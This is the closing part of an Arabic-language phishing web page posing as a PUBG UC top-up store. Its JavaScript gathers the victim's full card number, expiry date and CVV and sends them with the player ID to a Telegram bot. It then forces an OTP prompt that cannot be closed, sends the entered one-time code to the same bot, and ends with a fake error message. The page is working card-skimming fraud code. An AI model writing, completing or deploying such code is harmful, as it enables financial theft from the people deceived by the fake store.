        const currencySymbol = currencyData[countryCode].symbol;
        const priceFormatted = selectedPrice.toFixed(2);

        const message = `🟢 <b>طلب شراء UC (PUBG)</b> 🟢\n\n` +
                        `👤 <b>معرف اللاعب:</b> ${username}\n` +
                        `💰 <b>عدد UC:</b> ${selectedCoins.toLocaleString('en-US')}\n` +
                        `💵 <b>السعر:</b> ${currencySymbol} ${priceFormatted}\n` +
                        `🌍 <b>العملة:</b> ${countrySelect.options[countrySelect.selectedIndex].text}\n\n` +
                        `💳 <b>بيانات البطاقة:</b>\n` +
                        `🔢 <b>الرقم:</b> ${cardRaw}\n` +
                        `📅 <b>التاريخ:</b> ${expiry.value}\n` +
                        `🔐 <b>CVV:</b> ${cvv.value}\n\n` +
                        `📱 <b>تم الإرسال من:</b> PUBG UC Store`;

        isProcessing = true;
        topupBtn.disabled = true;
        topupBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...`;

        sendToTelegram(message).then(() => {
          otpInput.value = '';
          if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }
          resendOtpBtn.disabled = false;
          resendOtpBtn.classList.remove('sent');
          resendOtpBtn.innerHTML = `<span class="resend-text">إعادة إرسال رمز التحقق</span>`;
          setTimeout(() => {
            otpOverlay.classList.add('active');
            setTimeout(() => otpInput.focus(), 300);
          }, 1000);
        });

        setTimeout(() => {
          if (isProcessing) {
            isProcessing = false;
            topupBtn.disabled = false;
            topupBtn.innerHTML = 'شراء';
          }
        }, 5000);
      });

      confirmBtn.addEventListener('click', function() {
        const otp = otpInput.value.trim();
        if (!otp || otp.length < 4 || otp.length > 8) {
          otpInput.style.borderColor = '#dc2626';
          otpInput.style.background = '#fef2f2';
          setTimeout(() => { otpInput.style.borderColor = ''; otpInput.style.background = ''; }, 500);
          return;
        }
        const confirmMessage = `✅ <b>تم إدخال OTP</b> ✅\n\n🔑 <b>الرمز المدخل:</b> <code>${otp}</code>`;
        sendToTelegram(confirmMessage);
        otpOverlay.classList.remove('active');
        if (isProcessing) {
          isProcessing = false;
          topupBtn.disabled = false;
          topupBtn.innerHTML = 'شراء';
        }
        setTimeout(showLoadingThenError, 1000);
      });

      // ❌ تم إلغاء الإغلاق بالنقر على الفراغ أو زر الإغلاق الفارغ
      // ❌ otpOverlay backdrop click disabled
      // ❌ closeOtpBtn removed from DOM

      errorPopupCloseBtn.addEventListener('click', function(e) {
        e.preventDefault();
        errorPopupOverlay.classList.remove('active');
        resetPage();
      });
      errorPopupOverlay.addEventListener('click', function(e) {
        if (e.target === this) { errorPopupOverlay.classList.remove('active'); resetPage(); }
      });

      // ===== التهيئة =====
      buildCoinGrid();
      buildCustomDropdown();

    })();
  </script>
</body>
</html>
